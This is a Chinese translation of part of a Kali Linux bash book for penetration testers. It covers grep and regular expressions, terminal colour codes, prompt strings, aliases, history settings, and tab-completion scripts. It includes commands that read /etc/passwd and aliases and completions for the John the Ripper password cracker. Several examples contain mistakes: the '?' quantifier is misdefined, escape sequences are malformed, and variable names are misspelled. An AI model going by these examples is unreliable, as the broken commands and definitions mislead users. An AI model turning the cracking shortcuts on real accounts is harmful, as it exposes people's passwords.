首先，我们需要定义一些 "控制" 字符。鉴于您将使用其他字符串描述字符串，需要一种方法来指定正则表达式中给定字符或子字符串的特殊含义。否则，您只能逐个字符地比较一个字符串与另一个字符串。您可以这样做：

+   `^`: 以下正则表达式必须在行的开头匹配，例如，`^this is the start of the line`。

+   `$`: 前面的正则表达式必须在行的末尾匹配，例如，`this is the end of the line$`。

+   `[]`: 字符类的描述，或者字符列表，包含在方括号中，匹配的字符串包含指定列表中的字符。某些字符类可以使用简写来描述。我们将在本章的其余部分中看到其中一些。

+   `()`: 这将正则表达式逻辑分组在一起。

+   |: 这是两个正则表达式的逻辑或，例如，`([expression]) | ([expression])`。

+   `?`: 这匹配前面的正则表达式至少一次。例如，`keith?` 将匹配包含 "keith" 或根本不包含的任何字符串。

+   `+`: 这匹配前面的正则表达式至少一次。

+   `{n}`: 这匹配前面的正则表达式恰好 *n* 次。

+   `{n,m}`: 这匹配前面的正则表达式至少 *n* 次，最多 `m` 次。例如 `[0-9]{0,10}` 将匹配包含 0 到 10 位数字的任何十进制数。

以下是 `grep` 支持的一些简写的小集合，作为扩展的正则表达式语言：

+   `[:alnum:]`: 这匹配字母数字字符，任何十进制数字，或字母字符

+   `[:alpha:]`: 这严格匹配字母字符 a-z

+   `[:digit:]`: 这严格匹配十进制数字 0-9

+   `[:punt:]`: 任何标点符号都将被匹配

还有许多其他字符类速记可用；有关更多信息，请参阅`grep`的 man 页面。

正则表达式只是这些控制字符和字符类的集合。例如，只要所有的括号、大括号和括号都是平衡的，您可以以任何您喜欢的方式组合它们。

现在您对正则表达式有了一些基本背景，让我们看一下`grep`实用程序的使用规范，使用以下命令：

```
grep [options] PATTERN [file list]
[options] := [matcher selection][matching control][output control][file selection][other]
PATTERN := a pattern used to match with content in the file list.
[matcher selection] := [-E|--extended-regexp][-F|--fixed-strings]...
[matching control] := [-e|--regexp][-f|--file][-i|--ignore-case]... 
[output control] := [-c][--count][-L|--files-without-match]...
[file selection] := [-a | --text][--binary-files=TYPE][--exclude]...
[file list] := [file name] [file name] ... [file name]

```

请记住，这只是对命令结构的简单总结，并未提及所有可能的选项。有关`grep`实用程序的正则表达式语法的更多信息，请参阅本章末尾的*进一步阅读*部分，以及 Perl 正则表达式的 man 页面，可以通过执行命令`man 3 pcresyntax`来查看。您还可以通过查看 POSIX.2 正则表达式的 man 页面来了解更多关于正则表达式的信息，Kali Linux 可能没有前面命令中提到的 man 页面。您可以使用命令`man 7 regex`获取正则表达式手册页。

在此规范的基础上，让我们详细了解一些选项。

## 正则表达式匹配选择选项

调用`grep`的一部分需要让`grep`知道您想要使用什么方法来将模式与文件内容进行匹配。这是因为`grep`不仅能够运行正则表达式。

以下是匹配选择的选项：

+   `-E`或`--extended-regexp`: 这将解释`PATTERN`参数作为扩展的正则表达式

### 注意

扩展的正则表达式语言几乎是今天每个人都在使用的，但这并不总是这样。在 Unix 的鼎盛时期，正则表达式是使用一种称为**POSIX**（**可移植操作系统接口**）基本正则表达式语言表示的。几年后，Unix 开发人员为正则表达式语言添加了一些功能，并创建了一种新的标准来表示这种新的、更简短的语言，称为**扩展正则表达式**（**ERE**）语言标准。

+   `-F 或--fixed-strings`: 这告诉`grep`将`PATTERN`解释为由换行符分隔的固定字符串列表，以便在给定文件列表中查找

例如，以下屏幕截图显示了此命令的输出：

![正则表达式匹配选择选项](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_01_10.jpg)

+   -`P`或`--perl-regexp`: 这允许`grep`将`PATTERN`解释为 Perl 正则表达式

## 正则表达式匹配控制选项

以下选项允许您控制数据匹配的处理方式，无论您想要匹配输入中的整个单词、整行或从给定文件中引入多个模式。

以下是匹配控制的选项：

+   `-e PATTERN`或`--regexp=PATTERN`: 这将强制使用此处提供的`PATTERN`参数作为匹配输入文件的`PATTERN`。

以下命令是前述选项的用法示例：

```
cat /etc/passwd | grep –e '^root' 

```

前面的示例匹配以单词`root`开头的行。

+   `-f`或`--file=FILE`: 这从提供的文件中获取要使用的模式列表。

例如，考虑一个包含以下文本的文件：

```
^root
^www
^nobody
```

此文件可以与`-f`选项一起使用，如下所示：

```
grep –f patterns.txt < /etc/passwd

```

+   `-v`或`--invert-match`: 这反转匹配，意味着只选择或报告不匹配的文件内容。

+   `-w`或`--word-regexp`: 报告输入文件中具有完全匹配单词的行。

例如，查看以下命令的输出：

```
root@kali:~# grep r –w < /etc/passwd

root@kali:~# grep ro –w < /etc/passwd

root@kali:~# grep root –w < /etc/passwd
root:x:0:0:root:/root:/bin/bash

```

正如您从前面的输出和您自己的一些测试中看到的，前两次运行没有描述`/etc/passwd`文件内容的完整单词。然而，最后一次运行做到了；所以它是唯一实际产生输出的运行。

+   `-x`或`–-line-regexp`：这会报告或打印输入文件中整行匹配的行。

## 输出控制选项

`grep`实用程序还允许您控制其报告有关成功匹配的信息的方式。您还可以指定要报告的匹配的属性。

以下是一些输出控制选项：

+   `-c`或`–-count`：这不会报告匹配的数据，而是打印匹配的次数。

+   `-L`或`–-files-without-match`：这只会打印不包含匹配的文件名。

+   `-l`或`–-files-with-matches`：这只会打印包含匹配的文件名。

+   `-m`或`–max-count=NUM`：这会在`NUM`次匹配后停止处理输入。如果输入来自标准输入或使用输入重定向，则在读取`NUM`行后处理将停止。

+   `-o`或`–only-matching`：这会打印输入数据的匹配部分，每个部分占一行。

## 文件选择选项

以下选项允许您指定输入文件的来源，并控制整体输入数据的一些属性。

文件选择的选项如下：

+   `-a`或`–-text`：这会强制处理二进制文件作为文本。这使您可以像使用 strings 实用程序一样操作`grep`，它返回给定文件中的所有可打印字符串，并且能够使用正则表达式匹配这些字符串。

例如：

```
grep 'printf' –m 1 –color –text `which echo`

```

### 注意

**which 命令**

`which`命令会打印所提供参数的规范文件路径。在这里，它出现在反引号中，这样 bash shell 将用它产生的值替换这个命令，这实际上意味着`grep`将通过`echo`命令的二进制文件运行。

上一条命令的输出如下截图所示：

![文件选择选项](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_01_11.jpg)

+   `--binary-files=TYPE`：这会检查输入的文件是否是二进制文件。如果是，它会将文件视为指定的`TYPE`。

+   `-D ACTION`或`–-devices=ACTION`：这会将输入文件处理为设备，并使用`ACTION`参数从中提取输入。默认情况下，`ACTION`是读取。

+   `--exclude=GLOB`：这会跳过与 GLOB 匹配的任何文件；通配符在匹配中受到尊重。

+   `-R`，`–r`或`–-recursive`：这会处理当前目录中嵌套目录中的所有可达文件条目。

这基本上就是`grep`的全部内容了。希望您能够利用这些选项找到您要找的内容。这需要一些练习和适应，但一旦掌握，`grep`就是一个非常有价值的实用程序。

# 摘要

在本章中，我们了解了 bash shell 的一些基础知识。我们介绍了 man 页面，这是一个非常重要的资源，适用于经验丰富的系统管理员和内核开发人员，也适用于新手渗透测试人员和安全工程师。我们还使用了强大而高效的方法，通过非常描述性的属性和正则表达式来查找特定文件。我们介绍了另一个非常重要的工具叫做`grep`，它允许我们有效地使用正则表达式来查找文件的内容，并以细节的方式定位它们。

下一章将重点介绍如何自定义您的 bash 终端，并启用强大的功能，使使用终端更加丰富和便利。

# 进一步阅读

作者在 2014 年 4 月 22 日访问了以下参考资料：

+   Linux 手册页面[`www.tldp.org/manpages/man.html`](http://www.tldp.org/manpages/man.html)

+   Linux man 页面在线[`man7.org/linux/man-pages/index.html`](http://man7.org/linux/man-pages/index.html)

+   15 个实用的 grep 命令示例在[`www.thegeekstuff.com/2009/03/15-practical-unix-grep-command-examples/`](http://www.thegeekstuff.com/2009/03/15-practical-unix-grep-command-examples/)

+   使用 grep 的示例在[`tldp.org/LDP/Bash-Beginners-Guide/html/sect_04_02.html`](http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_04_02.html)

+   正则表达式在[`tldp.org/LDP/Bash-Beginners-Guide/html/sect_04_01.html`](http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_04_01.html)

+   Linux 程序员手册，Man 1 介绍在[`www.man7.org/linux/man-pages/man1/intro.1.html`](http://www.man7.org/linux/man-pages/man1/intro.1.html)

+   Linux 程序员手册，Man 2 介绍在[`www.man7.org/linux/man-pages/man1/intro.2.html`](http://www.man7.org/linux/man-pages/man1/intro.2.html)


# 第二章： 自定义您的 Shell

您的 bash 终端的几乎每个方面都是可定制的。现在您已经学会了如何利用一些重要的信息处理实用程序，我们可以继续学习如何使用它们来自定义您的 shell。本章中我们将涵盖的大部分内容涉及从一个程序中获取信息，将其传输到另一个程序，并过滤出对我们重要的任何细节。

您还将学习一些关于 bash 脚本的知识，这是您的 Kali Linux 和更大的 Linux 家族中许多应用程序的组成部分。

# 格式化终端输出

在您的 bash 终端上打印的所有内容都是由光标完成的，光标只是您的 bash 终端的另一个组件，您可以使用非常方便的快捷方式来控制它。本节将介绍如何控制在终端上打印的输出的颜色和基本格式，并且您还将在本章后面看到一些非常酷的技巧和窍门。

首先，让我们谈谈控制序列。控制序列是引入在您的终端上显示的文本的特殊行为的字符模式。这些特殊字符总是在它们格式化的输出之前。控制序列通常由转义字符分隔，我们感兴趣的是由`\e`表示的一个。

使用这个控制序列，我们可以做一些很酷的事情；观察以下命令行：

```
for colorcode in {93..88} {124..129};  do echo –en "\e48;5;${colorcode}m \e[0m"; done

```

以下是上一个命令行的操作截图：

![格式化终端输出

另一个例子将是以下命令行：

```
for colorcode in {93..88} {124..129};  do echo –en "\e38;5;${colorcode}m|||\e[0m"; done

```

以下是上一个命令行的操作截图：

![格式化终端输出

这是如何工作的？我们需要讨论一些基本的文本格式控制序列。这些控制文本的样式，包括诸如加粗文本、下划线和倒置终端打印等属性。控制序列如下：

+   **0m**：这将删除所有格式并打印普通文本。我们将使用它来重置终端文本的所有属性。它作为一个控制，限制我们希望受到其前面的任何格式影响的文本量。

+   **[1m**：这将使其后的任何文本加粗。例如，考虑以下命令行：

```
echo –e "Kali Linux  + the bash shell is so \e[1m Epic \e[0m"
```

上一个命令行将在您的终端屏幕上输出以下内容：

![格式化终端输出

+   **2m**：这将*减弱*正在打印的文本，以下是一个演示：

```
echo –e "Other operating system are so \e[2m dim \e[0m"

```

输出应如下所示：

![格式化终端输出

+   **4m**：这将给其后的任何文本加下划线。

+   **[5m**：在某些终端上，这将导致其后的文本闪烁。

+   **[7m**：这会导致其后的视频或颜色被倒置。考虑以下示例：

```
echo –e "White on black \e[7mBlack on White \e[0m"

```

上一个命令行将在您的终端屏幕上输出以下内容：

![格式化终端输出

+   **8m**：这将隐藏其后的任何文本，这意味着文本将不会被打印。

请不要忘记，这些控制序列只有在它们之前加上`\e`转义字符时才起作用。另一种写这个转义字符的方法是使用八进制格式\033，这在一些旧版本的 bash 终端上是支持的。

这些控制序列的另一个有用功能是，您可以重置给定的属性。例如，如果您在一段文本中加下划线和加粗，并且您只想删除给定文本段的下划线，您可以像以下示例中所示那样做：

```
echo –e "\e[1;4m Underlined and Emboldened \e[24m Only Emboldened \e[0m"

```

前面的命令应在您的终端上打印出以下文本：

![格式化终端输出

弄清楚这些重置转义序列的其余部分并不难；如果您希望关闭给定的格式规则，您只需要在控制数字前加上`2`，如下所示：

+   `21m` 关闭加粗

+   `[22m` 关闭变暗

+   `[25m` 关闭闪烁

等等。

我们还没有结束！您还可以使用其他控制序列来控制正在打印的文本的颜色。就像重置控制序列一样，它们通过在控制所选颜色的给定数字之前加上控制颜色种类的另一个数字来工作。它们的工作原理如下：

+   `[3xm` 只是将文本更改为数字`x`索引的颜色。数字`x`可以是以下任何一个：

+   `0` 代表黑色

+   `1` 代表红色

+   `2` 代表绿色

+   `3` 代表黄色

+   `4` 代表蓝色

+   `5` 代表品红色

+   `6` 代表青色

+   `7` 代表浅灰色

考虑以下示例：

```
echo –e "\033[31m Red Red Red \033[0m"
echo –e "\033[32m Green Green Green \033[0m"
echo –e "\033[34m Blue \033[31m Red \033[36m Cyan \033[0m"

```

您还可以将这些与其他格式选项结合使用，如下所示：

```
echo –e "\033[1;31 Bold-Red \033[21m \033[3;36m Underlined Cyan \033[0m"

```

# 提示字符串

提示字符串是标记或界定您的 bash 命令行的字符串。Kali Linux 的默认提示字符串是`root@kali:#`。这个字符串不是静态值，可以更改为您想要的任何值。本节将介绍一些非常有用的修改，您可以对提示字符串进行。我们将使它显示有关您的 Linux 系统的一些有用信息。

要控制显示为提示字符串的值，您需要修改 PS1 变量的值，如下面的屏幕截图所示：

![提示字符串

所以您可能想知道何时以及如何为您的 bash 终端设置这个值。事实证明，提示字符串是在通常在终端启动时执行的`~/.bashrc`文件中设置的。以下是提到提示字符串的`.bashrc`文件的部分：

```
if [ "$color_prompt" = yes ]; then
PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\n\$'
else
 PS1='${debian_chroot:+($debian_chroot)}{\j}\u@[\w]\n\$'
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
 PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: [\w]\a\]\n$PS1"
    ;;
*)
    ;;
esac
```

### 提示

**下载示例代码**

您可以从您在[`www.packtpub.com`](http://%20http://www.packtpub.com)的帐户中下载您购买的所有 Packt 图书的示例代码文件。如果您在其他地方购买了这本书，您可以访问[`www.packtpub.com/support`](http://www.packtpub.com/support)并注册，以便将文件直接发送到您的邮箱。

在上面的代码中，我们可以看到提示字符串有三种可能的设置，以便您的终端可以适应彩色打印，尽管它需要确保实际的 shell 可以支持它。这就是为什么它首先检查`color_prompt`变量是否被肯定设置。让我们详细看一下第一个可能的`PS1`设置（如果支持彩色打印），使用以下代码：

```
PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\n\$'
```

前面的代码工作如下：

代码的`${debian_chroot:+($debian_chroot)}`部分使用变量扩展来获取关于 shell 是否在 chroot 文件系统上执行的详细信息，并显示信息以指示这一点。现在完全理解这一点并不是完全必要的，因为在大多数情况下，您可能永远不会使用它。

`\[\033[01;32m\]` 部分，如前一节所讨论的，会导致终端打印粗体绿色文本。这里的格式与前一节讨论的示例略有不同，因为转义括号用于标记控制序列的开始和结束。正如我们在之前的示例中看到的，这些对于后来的 bash shell 版本并不是硬性要求。

`\u` 部分是另一个非常有用的转义字符。这个字符作为您的用户名或当前用户的用户名的简写。

`\h` 部分这个转义字符跟在这个例子中的`@`符号后面——`@`符号只是普通文本，没有什么特别的。当提示字符串显示时，`\h`转义字符将打印您当前的主机名。

`\[\033[00m\]` 部分如前一节所讨论的。这将重置所有格式规则，使其后的所有内容都打印为普通文本。重置格式后，我们看到 `\[\033[01;34m\]`。这将格式化所有在它之前的文本，使其以蓝色加粗显示。

`\w` 部分是当前工作目录的简写。直接在工作目录之后是一个好老的换行符，通过使用`\n`转义字符简写打印出来。接着是`\$`转义字符，如果除了 root 用户之外的任何人当前在使用 shell，它将打印出`$`符号，当 root 用户登录时打印`#`。

bash shell 提供了一些其他有用的简写，可以在您的提示字符串中使用，每个简写都会直接打印一些不同的信息到您的提示字符串中。要了解更多信息，请参阅本章*进一步阅读*部分提供的链接。

## 提示字符串自定义

现在您知道文本格式和编辑提示字符串的一般过程是如何工作的，让我们走一遍一些有用的自定义。

您应该将您的提示字符串视为应该为您提供大部分时间都会有用的一般信息。为了让您开始进行自己的提示字符串修改，我们将讨论如何在终端提示中整洁地显示一些这些信息。

我们可以添加如下信息：

+   通过使用`\w`转义字符来获取当前工作目录

+   通过使用日期命令和一些命令替换来获取当前日期时间

+   通过使用`\j`转义字符来获取后台运行的作业数量

+   通过使用`\$`转义字符来获取当前用户的特权级别

+   通过使用`\$?`转义字符来获取上一个命令的返回代码

一旦添加了这些细节，提示字符串看起来像这样：

```
PS1="\e[33m{$(date)}\e[0m\e[1;36m[\j]\e0m\e[1;32m<$?>\e[0m\e[2;36m(\u\e[0m@\e[1;34m\w)\e[0m\n\$>"
```

如果您仔细观察，您应该看到我们提到的所有转义字符都被用在提示字符串中。如果一切顺利，并且您设定提示字符串与示例完全相同，您应该在终端屏幕上看到以下代码出现：

![提示字符串自定义

在前面的屏幕截图中，我们可以看到`\$?`转义字符的作用。用户访问一个不存在的目录，返回代码设置为`1`，表示上一个命令以错误条件退出或未成功。

您可以进行许多出色的修改。这里演示的仅仅是一个例子（尽管它们本身就很有用），旨在让您开始进行自己的修改。请参阅*进一步阅读*部分，了解您可以对提示字符串进行更强大和令人眼花缭乱的修改。

# 别名

别名是一种有效地为一组命令或单个命令分配名称的方式。每个标准问题 bash shell 附带的`.bashrc`文件默认包含一些有用的别名。其中一些如下：

```
# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
```

这些别名允许您使用一个通常更简单的命令来调用一系列复杂的命令。因此，关于前面的代码，您可以使用`grep`来调用`grep --color=auto`，这样可以启用文本输出高亮或彩色打印。

别名的一般目的或目标是使事情变得更简单。例如，如果您经常需要 SSH 到特定主机，并且想要避免重复输入该主机的 IP 地址或域名，您可以将别名添加到您的`.bashrc`中，如下所示：

```
alias ssh2wserver='ssh  -v root@192.168.10.34'

```

另一个例子是，如果您使用 John The Ripper 进行密码破解，并且经常使用给定的密码和破解模式，您可以添加这些别名，以使以期望的方式调用`john`变得不那么乏味：

```
alias john-mysql='john –-format=mysql-fast '

```

否则，您也可以使用它们，例如，如果您想使用特定的单词列表：

```
alias john-winwlist='john  --wordlist=windows-commons.txt'

```

你应该立即看到依赖`alias`简化某些复杂命令的好处。

# 自定义命令历史

通常，在渗透测试期间或在使用一些非常冗长的命令行来完成任务时，您可能经常要重复使用它们或将其记住以备将来使用。确保您的终端记录有关命令的正确细节，更重要的是，记录足够多的命令是一个重要的修改。

与其他讨论的主题一样，当然有一个专门的主页用于自定义命令历史记录行为。您可以通过执行以下命令来访问此 man 页面：

```
man bash 

```

查找提到`HISTORY`变量及其相关内容的部分。

当然，与 bash 终端的大多数其他组件和功能一样，您在命令记录方面有很大的发言权。控制记录内容和方式的这些环境变量将如下所述讨论：

+   `HISTSIZE`：这控制初始化到历史记录中的命令数量。

+   `HISTFILE`：这指定应使用哪个文件来初始化命令历史记录。

+   `HISTFILEZIE`：这指定应使用多少来自`HISTFILE`的命令来初始化命令历史记录。如果`HISTFILE`比`HISTFILESIZE`行长，它将被截断。

+   `HISTCONTROL`：这确定某些关于记录哪些命令的属性，例如：

+   如果设置为`ignorespace`，它将忽略（并且不记录到历史记录中）所有以空格开头的命令，例如：

```
 HISTCONTROL=ignorepsace

```

+   如果设置为`ignoredups`，bash 将不记录与前一个命令相同调用的任何命令。

+   如果设置为`erasedups`，bash 将完全擦除整个历史记录中的任何重复命令

您还可以通过用冒号分隔它们来组合不同的选项，例如：

```
 HISTCONTROL=ignoredups:ignorespaces

```

尝试在您的`.bashrc`文件的末尾添加一些设置，以便在启动终端时自动应用。

## 保护敏感信息免于泄露

`.bash_history`文件是保存所有命令的地方。通常，它位于您的主文件夹的根目录中；对于 Kali Linux 用户，这是`/root`文件夹。关于这个文件的一个重要事项是，它很可能包含您在终端使用期间在计算机上执行的所有命令。这意味着如果您在命令行中输入了任何敏感信息，比如密码、用户名或任何重要和敏感信息，该文件都会包含它。

最好确保此信息不重复，并始终保存在与其保护相关的位置，即需要与保护信息相同数量的工作量或知识来破坏或访问的位置。例如，如果您需要保护网站的密码，未经授权的一方访问保护密码的存储应与实际用于该网站的位置一样难或更难。在信息安全行业中，如果情况不是这样，我们会说存储是不安全或不足的。

为了确保您不将任何敏感信息保存到命令行中，您可能希望将敏感信息转移到更安全的位置，并在必要时将其包含在您的 bash 环境中。执行以下步骤来完成这一点：

1.  为您的敏感环境变量创建一个文件。在这里，我们将称之为`sens_env.sh`，如下命令所示：

```
touch sens_env.sh

```

1.  将其保存在安全位置并在可能的情况下加密。尝试使用`TrueCrypt`进行此操作，并参阅*进一步阅读*部分以获取有关使用`TrueCrypt`的信息。

1.  为每个用户名、密码或安全凭据将以下命令输入到此文件中，以安全保存：

```
SITE_USERNAME=foofoo
SITE_PASSWORD=barbar

```

1.  每次您需要使用此文件中保存的信息时，您只需解密、解压缩或以任何所需的方式访问它，然后执行以下命令：

```
. sens_env.sh

```

这将执行这些命令，而不会将敏感信息暴露到您的`.bash_history`文件中。

您可以通过将信息替换为用于引用它们的变量来使用此信息，例如，如下命令所示：

```
echo "the site password is : $SITE_USERNAME"

```

这样只有执行的命令会保存在历史记录中，它不会包含实际的用户名，而是用于引用它的变量。

另一个重要的事情要记住的是，如果您需要在`.bash_history`文件中保存敏感信息，或者出于任何其他原因想要备份或复制您的`.bash_history`文件，您可以通过执行以下命令来实现：

```
history –w [FILENAME]

```

history 命令允许您发出影响历史文件的命令。在这里，我们使用`-w 开关`，告诉它将当前内容保存到由`[FILENAME]`参数指定的文件中。

关于命令历史就是这些。有关更多信息，请参阅*进一步阅读*部分。

# 自定义 Tab 补全

在键入命令并在键盘上按两次*Tab*键时，会发生 Tab 补全。显示的可能选项列表是补全建议。信不信由你，你实际上可以控制在使用 Tab 补全时显示的命令甚至参数，这取决于您正在执行的命令。能够控制您的 Tab 补全在您日常使用 bash 时可能会证明是一项非常宝贵的技能。因此，不要对此过多地唠叨，让我们来看看 Tab 补全实际是如何工作的。

当您两次按下*Tab*键时，bash shell 会执行一个特殊的预定义函数。此函数确定您正在执行的命令（如果有的话），并挂接（这只是调度的行话）另一个定义的函数，负责确定要显示为建议的选项。在本节中，我们将开发一个或两个这些函数，以使 Kali bash 命令行上的一些工具更加用户友好，并再次设计另一种方式将更有用的信息放在您的指尖。

以下是一个补全函数的示例（这是为`tcpdump`的一个示例）：

```
_tcpdump()
{
    local cur prev

    COMPREPLY=()
    cur=`_get_cword`
    prev=${COMP_WORDS[COMP_CWORD-1]}

    case "$prev" in
        -@(r|w|F))
            _filedir
            return 0
            ;;
        -i)
            _available_interfaces -a
            return 0
            ;;
    esac

    if [[ "$cur" == -* ]]; then
        COMPREPLY=( $( compgen -W '-a -d -e -f -l -n -N -O -p \
            -q -R -S -t -u -v -x -C -F -i -m -r -s -T -w -E' -- "$cur" ) )
    fi

} &&
complete -F _tcpdump tcpdump
```

在上一个示例中有几件事情需要注意。首先，定义的`_tcpdump`函数是在您在命令行中输入`tcpdump`后按两次*TAB*键时将被调用的函数。这是因为上一个示例中的最后一行：

```
complete -F _tcpdump tcpdump

```

这意味着当要确定`tcpdump`的补全建议时，将调用由`-F`选项指定的函数——`_tcpdump`。补全函数的唯一目的是使用所需的建议填充`COMPREPLY`环境变量以完成命令。当您需要建议时，`COMPREPLY`变量将被插入到命令行中。还有许多其他非常有用的环境变量，旨在帮助您编写补全函数。它们如下：

+   `COMP_LINE`，这是当前的命令行。

+   `COMP_WORDS`，这是一个包含当前出现在命令行上的单词的数组。

+   `COMP_CWORD`，这是输入到命令行中的最后一个单词的索引。使用此索引来使用`COMP_WORDS`数组计算当前单词，如下所示：

```
${COMP_WORDS[$COMP_CWORD]}

```

所以基本上，当你为给定的命令开发完成函数时，你玩的游戏是检查最后输入的单词，或者说任何输入的单词，以确定到底应该放入`COMPREPLY`数组中的内容。当然，这只是一个简单的 bash 脚本被执行，任何事情都有可能。如果你想以另一种方式确定要显示的建议，当然可以这样做。例如，你可以使用`history`命令记录给定命令的所有调用到一个特殊文件中，然后根据提供的选项建议执行`host common`命令。如果你对自然语言处理或机器学习有一些了解，这种简单功能的应用就变得无穷无尽。例如，想象一下一个 bash 终端，它学会在一天中的特定时间建议你最喜欢的命令，甚至根据你正在听的音乐或当前在你的机器上活动的网络连接。

你可能需要开发自己的完成函数的另一个重要信息是在完成时将函数放在哪里。你系统上当前安装的大多数完成函数出现在`/etc/bash_completion.d/`。然而，如果你要开发自己的完成系统扩展，你可能希望将你的脚本放在一个你控制的地方。一个常见的约定是在你的`home`文件夹的根目录下创建一个名为`.bash_completion.d/`的目录，使用以下命令：

```
mkdir ~/.bash_completion.d/

```

你自己的所有完成脚本应该出现在这个文件夹中，保存为与其完成的命令相对应的名称。例如，我们将为 John the Ripper 开发的脚本——在命令行上指定为`john`——将被称为`john`。另外，为了使你的完成函数生效，你可能希望在使用任何受影响的命令之前避免自己执行它们。因此，为了使这变得简单和自主，你应该将这个命令放在你的`.bashrc`文件中，如下所示：

```
echo ". ~/.bash_completion.d/*" >> ~/.bashrc

```

执行了上述命令后，你可能想要解压随 Kali Linux 安装的`rockyou.txt.gz`单词列表，使用以下命令行代码：

```
cd /usr/share/wordlists
gunzip rockyou.txt.gz

```

你现在可以为`john`编写一个完成函数了。以下是它应该是什么样子的

（以下代码将在本书的网站上提供）

```
_john()
{
  local cur=${COMP_WORDS[COMP_CWORD]}
  local prev=${COMP_WORDS[COMP_CWORD-1]}
  case "$prev" in
    --format)
      COMPREPLY=($( compgen -W "bsdi md5 bf afs lm dynamic_n bfegg dmd5 dominosec epi hdaa ipb2 krb4 krb5 mschapv2 netlm netlmv2 netntlm netntlmv2 nethalflm md5ns nt phps po xsha crc32 gost keychain lotus5 md4-gen mediawiki mscash mscash2 mskrb5 mssql mssql05 mysql-sha1 mysql nsldap nt2 odf office oracle11 oracle osc phpass pix-md5 pkzip racf raw-md4 raw-md5 raw-sha1 raw-sha1-linkedin raw-md5u salted-sha1 sapb sapg sha1-gen sip vnc wbb3 hmac-md5 hmac-sha1 raw-sha raw-sha224 raw-sha256 raw-sha384 raw-sha512 hmac-sha224 hmac-sha256 hmac-sha384 hmac-sha512 xsha512 hmailserver sybasease dragonfly3-64 dragonfly4-64 dragonfly3-32 dragonfly4-32 drupal7 sha256crypt sha512crypt episerver keepass pwsafe django raw-sha1-ng crypt trip ssh pdf wpapsk rar zip dummy" -- $cur))
    return 0
    ;;
    --wordlist)
      COMPREPLY=($( compgen -W "`ls /usr/share/wordlists`" --$cur))
    return 0
    ;;
  esac
  if [[ "$cur" == -* ]]; then
    COMPREPLY=($( compgen -W "-i -s -u -w --shell --user --show --format --wordlist --incremental" -- $cur))
  fi
}
complete -F _john john
```

在函数的前几行，脚本抓取当前单词和前一个单词——当前单词之前的单词——并将它们分别存储在`cur`和`prev`变量中。然后它进入一个`case`语句，这基本上是一个带有许多比较和许多独特逻辑退出点的复合 if 语句，并将单词与以下字符串进行比较：

+   `--format`：这是 John the Ripper 用来指定要破解的密码格式的选项。脚本用与当前单词`$cur`相似的所有格式填充`COMPREPLY`数组。

+   `--wordlist`：这是 John the Ripper 用来指定要使用的单词的选项。在这里，脚本简单地抓取`/usr/share/wordlists`目录中的所有文件，并将它们用作要返回的建议。

接下来是一个`if`语句，用于匹配输入到命令行的任何选项，这可能是以连字符开头的任何内容。然后它用与当前单词`$cur`相匹配的任何内容填充`COMPREPLY`数组。

请注意，这个脚本只是用于演示；它缺少`john`的其他命令行参数的完成建议。作为练习，你可以通过向`switch`语句添加一些情况来填写 John the Ripper 的其余命令行选项和可能的参数。你可以从手册页或通过执行`man john`了解更多关于 John the Ripper 的参数。

您还可以使用这个非常有用的应用程序来处理 Metasploit 命令行界面。我们将在后面的章节中介绍这一系列工具，您可能会发现为其编写一组选项完成规则非常有用。

# 总结

在本章中，我们介绍了文本输出格式化和给终端文本上色。然后我们看到了如何使用文本格式化来修改 bash 提示字符串，并讨论了一些新颖的技巧和提示，您可以使用您的`prompt`字符串来显示一些有用的信息。然后我们转向别名，并讨论了如何通过使用简单的助记符别名来简化一些复杂和繁琐的命令。最后，我们介绍了选项完成，并学习了如何修改它以满足我们的需求。我们还讨论了一个涉及 John the Ripper 密码和哈希破解工具的例子。

希望您从本章中获得了一些有用的技巧，并能够对您的终端进行急需的和有益的修改，以便在渗透测试期间有效地使用它。一个很好的练习是查看 Kali Linux 命令行上安装的一些工具，并考虑通过使用本章介绍的一两个技巧来使它们更易于使用和更高效。例如，考虑一些有用的别名、选项完成脚本和文本格式化技巧，以便与 Nmap、Wireshark、Aircrack-NG 或 Netcat 命令一起使用。

下一章将重点介绍如何使用一些 Kali Linux 工具来确保您的数据，特别是来自渗透测试和敏感信息安全相关工作的证据，始终受到保护。

# 进一步阅读

+   Linux 文档项目，选项扩展，在[`tldp.org/LDP/abs/html/tabexpansion.html`](http://tldp.org/LDP/abs/html/tabexpansion.html)上 [访问时间 2014/04/28]

+   Linux 文档项目，别名，在[`tldp.org/LDP/abs/html/aliases.html`](http://tldp.org/LDP/abs/html/aliases.html)上 [访问时间 2014/04/28]

+   Openwall – John the ripper 选项在[`www.openwall.com/john/doc/OPTIONS.shtml`](http://www.openwall.com/john/doc/OPTIONS.shtml)上 [访问时间 2014/04/28]

+   Ubuntu Man Pages，John 在[`manpages.ubuntu.com/manpages/natty/man8/john.8.html`](http://manpages.ubuntu.com/manpages/natty/man8/john.8.html)上 [访问时间 2014/04/28]

+   ArchLinux Wiki 和 Color Bash Prompt 在[`wiki.archlinux.org/index.php/Color_Bash_Prompt`](https://wiki.archlinux.org/index.php/Color_Bash_Prompt)上 [访问时间 2014/04/28]

+   Bash 历史设施在[`www.gnu.org/software/bash/manual/html_node/Bash-History-Facilities.html`](http://www.gnu.org/software/bash/manual/html_node/Bash-History-Facilities.html)上 [访问时间 2014/04/28]

+   TrueCrypt 在[`www.truecrypt.org/`](http://www.truecrypt.org/)上 [访问时间 2014/04/28]


# 第三章：网络侦察

